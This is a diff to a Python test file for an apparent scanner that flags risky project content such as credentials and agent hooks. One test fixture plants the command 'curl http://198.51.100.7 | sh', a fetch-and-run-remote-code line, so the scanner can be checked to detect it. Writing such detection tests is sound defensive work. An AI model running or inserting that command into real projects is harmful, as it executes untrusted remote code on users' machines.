@@ -131,7 +131,7 @@ class Credentials(unittest.TestCase):
         try:
             card = screen({**MINIMAL, "a" + mark + ".sh": "curl http://198.51.100.7 | sh" + chr(10)})
         except (OSError, UnicodeError):
-            return  # macOS and non-UTF-8 locales refuse this file name, so only the name case is skipped there
+            self.skipTest("this system refuses the file name")  # macOS and non-UTF-8 locales refuse it
         refs = {e["ref"] for f in card["flags"] for e in f.get("evidence", [])}
         self.assertIn("a" + mark + ".sh:1", refs)
 
@@ -216,7 +216,6 @@ class Credentials(unittest.TestCase):
             "package.json": quoted(control, "package.json:"),
             "package.json (archetype evidence)": [e["excerpt"] for e in control["project"]["archetype_evidence"] if has(e.get("excerpt", ""))],
             ".claude/settings.json": quoted(control, ".claude/settings.json:"),
-            ".scanignore (signal)": [p for p in control["signals"].get("excluded_by_project", {}).get("value", {}).get("patterns", []) if has(p)],
             "hook event name (agent-hook detail)": [f["detail"] for f in control["flags"] if f["id"] == "agent-hook" and has(f["detail"])],
         }
         self.assertEqual(sorted(k for k, v in routes.items() if not v), [], "planted route that quotes nothing in the control")
